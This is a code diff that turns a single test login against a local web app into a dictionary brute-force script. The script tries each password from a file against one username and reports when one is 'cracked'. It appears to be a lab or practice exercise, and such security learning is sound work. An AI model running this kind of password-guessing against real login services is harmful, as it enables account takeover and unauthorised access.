@@ -1,25 +1,42 @@
 import requests
 
 LOGIN_URL = "http://127.0.0.1:5000/login"
-USERNAME = "user"
-PASSWORD = "test"
 
-def try_login():
+
+def try_login(username, password):
     session = requests.Session()
-
     response = session.post(
         LOGIN_URL,
         data={
-            "username": USERNAME,
-            "password": PASSWORD
+            "username": username,
+            "password": password
         },
         allow_redirects=True
     )
 
     if "Logged in as" in response.text or "test" in response.url:
-        print("Login successful")
+        return True
     else:
-        print("Login failed")
+        return False
+
+
+def bruteforce(filename, username):
+    with open(filename, "r") as file:
+        passwords = file.readlines()
+        for line in passwords:
+            line = line.rstrip("\n")
+            print(f"trying: {username},{line}")
+            if try_login(username, line):
+                return True
+    return False
+
+
+def main():
+    if bruteforce("passwords.txt", "user"):
+        print("Password cracked")
+    else:
+        print("Unsuccessful")
+
 
 if __name__ == "__main__":
-    try_login()
+    main()
